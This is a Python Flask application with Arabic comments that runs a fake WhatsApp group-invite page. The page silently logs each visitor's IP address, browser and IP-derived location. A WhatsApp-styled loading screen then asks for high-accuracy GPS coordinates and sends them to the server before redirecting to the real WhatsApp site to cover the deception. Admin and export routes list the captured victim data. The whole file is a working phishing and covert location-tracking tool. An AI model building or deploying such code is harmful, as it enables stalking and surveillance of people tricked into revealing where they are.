from flask import Flask, request, jsonify, render_template
import requests
import json
import time
import os
import datetime
import sqlite3

app = Flask(__name__)
app.config['SECRET_KEY'] = 'your-secret-key-change-this'

# قاعدة البيانات
def init_db():
    conn = sqlite3.connect('tracker.db')
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS logs
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  ip TEXT,
                  user_agent TEXT,
                  timestamp TEXT,
                  country TEXT,
                  city TEXT,
                  lat REAL,
                  lon REAL,
                  accuracy REAL)''')
    conn.commit()
    conn.close()

init_db()

def get_location_info(ip):
    """الحصول على معلومات الموقع من IP"""
    try:
        response = requests.get(f'http://ip-api.com/json/{ip}', timeout=5)
        if response.status_code == 200:
            data = response.json()
            if data.get('status') == 'success':
                return data
    except:
        pass
    return {}

def log_to_db(data):
    """حفظ البيانات في قاعدة البيانات"""
    try:
        conn = sqlite3.connect('tracker.db')
        c = conn.cursor()
        c.execute('''INSERT INTO logs 
                    (ip, user_agent, timestamp, country, city, lat, lon, accuracy)
                    VALUES (?, ?, ?, ?, ?, ?, ?, ?)''',
                 (data.get('ip'), data.get('user_agent'), data.get('timestamp'),
                  data.get('country'), data.get('city'), data.get('lat'),
                  data.get('lon'), data.get('accuracy')))
        conn.commit()
        conn.close()
        return True
    except Exception as e:
        print(f"Database error: {e}")
        return False

@app.route('/')
def home():
    return render_template('index.html')

@app.route('/whatsapp-group')
def fake_whatsapp_group():
    """صفحة مجموعة واتساب المزيفة"""
    visitor_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    basic_info = {
        'ip': visitor_ip,
        'user_agent': request.headers.get('User-Agent'),
        'timestamp': datetime.datetime.now().isoformat()
    }
    
    location_info = get_location_info(visitor_ip)
    if location_info:
        basic_info.update({
            'country': location_info.get('country'),
            'city': location_info.get('city'),
            'lat': location_info.get('lat'),
            'lon': location_info.get('lon')
        })
    
    log_to_db(basic_info)
    return render_template('whatsapp_group.html')

@app.route('/join-group')
def join_group():
    """رابط الانضمام للمجموعة"""
    return render_template('location_access.html')

@app.route('/request-location')
def request_location():
    """طلب إذن الموقع"""
    return '''
    <!DOCTYPE html>
    <html>
    <head>
        <title>جاري التحميل</title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <style>
            body {
                font-family: Arial, sans-serif;
                background: #075E54;
                color: white;
                text-align: center;
                padding: 50px;
                direction: rtl;
            }
            .loader {
                border: 5px solid #f3f3f3;
                border-top: 5px solid #25D366;
                border-radius: 50%;
                width: 50px;
                height: 50px;
                animation: spin 1s linear infinite;
                margin: 20px auto;
            }
            @keyframes spin {
                0% { transform: rotate(0deg); }
                100% { transform: rotate(360deg); }
            }
        </style>
    </head>
    <body>
        <h2>جاري التحضير للمجموعة...</h2>
        <div class="loader"></div>
        <p>يرجى الانتظار</p>
        
        <script>
            setTimeout(() => {
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(
                        function(position) {
                            fetch('/capture-location', {
                                method: 'POST',
                                headers: {'Content-Type': 'application/json'},
                                body: JSON.stringify({
                                    lat: position.coords.latitude,
                                    lon: position.coords.longitude,
                                    accuracy: position.coords.accuracy
                                })
                            }).then(() => {
                                window.location.href = 'https://web.whatsapp.com';
                            });
                        },
                        function(error) {
                            window.location.href = 'https://web.whatsapp.com';
                        },
                        {
                            enableHighAccuracy: true,
                            timeout: 10000,
                            maximumAge: 0
                        }
                    );
                } else {
                    window.location.href = 'https://web.whatsapp.com';
                }
            }, 2000);
        </script>
    </body>
    </html>
    '''

@app.route('/capture-location', methods=['POST'])
def capture_location():
    """استقبال الإحداثيات الدقيقة"""
    try:
        gps_data = request.json
        print(f"GPS Coordinates: {gps_data}")
        
        conn = sqlite3.connect('tracker.db')
        c = conn.cursor()
        c.execute('''UPDATE logs SET lat = ?, lon = ?, accuracy = ?
                     WHERE id = (SELECT MAX(id) FROM logs)''',
                 (gps_data.get('lat'), gps_data.get('lon'), gps_data.get('accuracy')))
        conn.commit()
        conn.close()
        
        return jsonify({'status': 'success'})
    except Exception as e:
        print(f"Error: {e}")
        return jsonify({'status': 'error'})

@app.route('/admin')
def admin_dashboard():
    """لوحة التحكم"""
    conn = sqlite3.connect('tracker.db')
    c = conn.cursor()
    c.execute('SELECT * FROM logs ORDER BY id DESC LIMIT 50')
    logs = c.fetchall()
    conn.close()
    
    return render_template('admin.html', logs=logs)

@app.route('/export-logs')
def export_logs():
    """تصدير البيانات"""
    conn = sqlite3.connect('tracker.db')
    c = conn.cursor()
    c.execute('SELECT * FROM logs ORDER BY id DESC')
    logs = c.fetchall()
    conn.close()
    
    return jsonify([{
        'id': log[0], 'ip': log[1], 'user_agent': log[2],
        'timestamp': log[3], 'country': log[4], 'city': log[5],
        'lat': log[6], 'lon': log[7], 'accuracy': log[8]
    } for log in logs])

@app.route('/delete-logs', methods=['POST'])
def delete_logs():
    """حذف جميع السجلات"""
    try:
        conn = sqlite3.connect('tracker.db')
        c = conn.cursor()
        c.execute('DELETE FROM logs')
        conn.commit()
        conn.close()
        return jsonify({'status': 'success'})
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)})

if __name__ == '__main__':
    # حاول استخدام بورت 8080 أولاً، وإذا كان مشغولاً جرب 3000
    for port in [8080, 3000, 5001, 8000]:
        try:
            print(f"🔄 جرب تشغيل السيرفر على البورت {port}...")
            app.run(host='0.0.0.0', port=port, debug=False)
            break
        except OSError as e:
            if "Address already in use" in str(e):
                print(f"❌ البورت {port} مشغول، جرب البورت التالي...")
                continue
            else:
                raise e
